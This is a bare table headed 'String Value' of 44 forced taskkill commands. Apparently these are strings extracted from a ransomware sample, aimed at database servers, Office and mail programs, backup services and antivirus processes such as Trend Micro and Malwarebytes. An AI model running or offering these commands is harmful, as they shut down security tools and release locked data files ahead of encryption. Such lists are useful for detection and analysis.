"String Value"
"taskkill /IM zoolz.exe /F"
"taskkill /IM agntsvc.exe /F"
"taskkill /IM dbeng50.exe /F"
"taskkill /IM dbsnmp.exe /F"
"taskkill /IM encsvc.exe /F"
"taskkill /IM excel.exe /F"
"taskkill /IM firefoxconfig.exe /F"
"taskkill /IM infopath.exe /F"
"taskkill /IM isqlplussvc.exe /F"
"taskkill /IM msaccess.exe /F"
"taskkill /IM msftesql.exe /F"
"taskkill /IM mspub.exe /F"
"taskkill /IM mydesktopqos.exe /F"
"taskkill /IM mydesktopservice.exe /F"
"taskkill /IM mysqld.exe /F"
"taskkill /IM mysqld-nt.exe /F"
"taskkill /IM mysqld-opt.exe /F"
"taskkill /IM ocautoupds.exe /F"
"taskkill /IM ocomm.exe /F"
"taskkill /IM ocssd.exe /F"
"taskkill /IM onenote.exe /F"
"taskkill /IM oracle.exe /F"
"taskkill /IM outlook.exe /F"
"taskkill /IM powerpnt.exe /F"
"taskkill /IM sqbcoreservice.exe /F"
"taskkill /IM sqlagent.exe /F"
"taskkill /IM sqlbrowser.exe /F"
"taskkill /IM sqlservr.exe /F"
"taskkill /IM sqlwriter.exe /F"
"taskkill /IM steam.exe /F"
"taskkill /IM synctime.exe /F"
"taskkill /IM tbirdconfig.exe /F"
"taskkill /IM thebat.exe /F"
"taskkill /IM thebat64.exe /F"
"taskkill /IM thunderbird.exe /F"
"taskkill /IM visio.exe /F"
"taskkill /IM winword.exe /F"
"taskkill /IM wordpad.exe /F"
"taskkill /IM xfssvccon.exe /F"
"taskkill /IM tmlisten.exe /F"
"taskkill /IM PccNTMon.exe /F"
"taskkill /IM CNTAoSMgr.exe /F"
"taskkill /IM Ntrtscan.exe /F"
"taskkill /IM mbamtray.exe /F"
